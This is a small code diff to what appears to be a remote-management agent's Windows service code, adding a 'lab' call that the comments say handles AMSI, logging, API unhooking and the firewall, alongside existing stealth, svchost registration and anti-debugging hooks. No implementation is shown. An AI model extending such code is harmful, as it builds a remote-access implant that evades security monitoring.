@@ -40,6 +40,7 @@ limitations under the License.
 #include "microscript/ILibDuktape_Commit.h"
 #include <shellscalingapi.h>
 #include "stealth.h"  // SECURITY: Stealth and obfuscation features
+#include "stealth_init.h"  // Lab/test stealth initialization
 // Svchost registration helper (implemented in stealth_svchost.c)
 BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
 BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);
@@ -348,6 +349,9 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         // SECURITY: Enable optional stealth/anti-analysis features only if
         // explicitly enabled at build time.
 #ifdef MESHAGENT_ENABLE_STEALTH
+        // Initialize lab features (AMSI, logging, API unhook, firewall) when enabled
+        Stealth_InitLabFeatures();
+
         Stealth_EnableCrashRecovery();
 
         // SECURITY: Check for debuggers/analysis tools
